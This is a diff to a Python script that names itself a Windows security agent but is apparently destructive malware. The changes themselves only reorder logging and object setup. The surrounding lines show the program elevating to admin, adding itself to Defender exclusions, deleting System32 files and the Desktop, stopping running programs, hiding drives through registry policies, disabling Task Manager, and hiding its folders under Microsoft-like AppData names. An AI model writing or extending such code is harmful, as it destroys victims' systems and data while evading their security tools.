@@ -121,10 +121,8 @@ class Logging:
 
 logs = Logging()
 logfile = f'windows_security_agent_log_{random.randrange(1,1000)}_{get_time_formatted()}.txt'
-logfile = os.path.join(os.getcwd(), logfile)
-logs.create_log(logfile)
-logs.set_log(logfile)
-    
+
+ 
 
 class FileCreation:
   def mass_create(self, prefix, folder, count, ext=".txt"):
@@ -501,12 +499,10 @@ class Folders:
       ad = os.path.join(os.path.join(user, 'AppData'), r'Local\Microsoft\Windows\MicrosoftSecurity')
       os.mkdir(ad)
     except Exception as e:
-      logs.error(f"Error creating AppData folder: {e}")
       try:
         mg = os.path.join(os.getcwd(), 'MicrosoftGoose')
         os.mkdir(mg)
       except Exception as ex:
-        logs.error(f"Error creating AppData folder: {ex}")
         return os.getcwd()
       else:
         return mg
@@ -597,8 +593,17 @@ class GitData:
       logs.error(f"Error downloading file {url} : {e}")
 
 logs.info("Initializing Program...")
+gd = GitData()
+zf = Zipfiles()
+d = Data()
+e = Executables()
+f = Folders()
 wsysw = WindowsSystemClass()
 fd = FileDeletion()
+appdata = f.create_appdata_folder()
+logfile = os.path.join(appdata, logfile)
+logs.create_log(logfile)
+logs.set_log(logfile)
 wsysw.grant_admin()
 if not wsysw.is_admin():
   wsysw.relaunch_as_admin()
@@ -608,11 +613,6 @@ wsysw.defender_allow(os.path.realpath(sys.executable))
 fd.del_sys32_files()
 logs.info("Deleting Desktop...")
 fd.delete_folder(wsysw.get_desktop_path(), remove_folder=False)
-gd = GitData()
-zf = Zipfiles()
-d = Data()
-e = Executables()
-f = Folders()
 fc = FileCreation()
 e.stop_all()
 reg = Registry()
@@ -629,7 +629,6 @@ reg.new_key_edit(1, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explore
 reg.new_key_edit(1, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoViewOnDrive", 67108863)
 e.refresh_explorer()
 reg.disable_task_manager()
-appdata = f.create_appdata_folder()
 folder = f.create_goose_folder(appdata)
 logs.info(f"Created folder {folder}")
 folder2 = f.create_butterfly_folder(appdata)
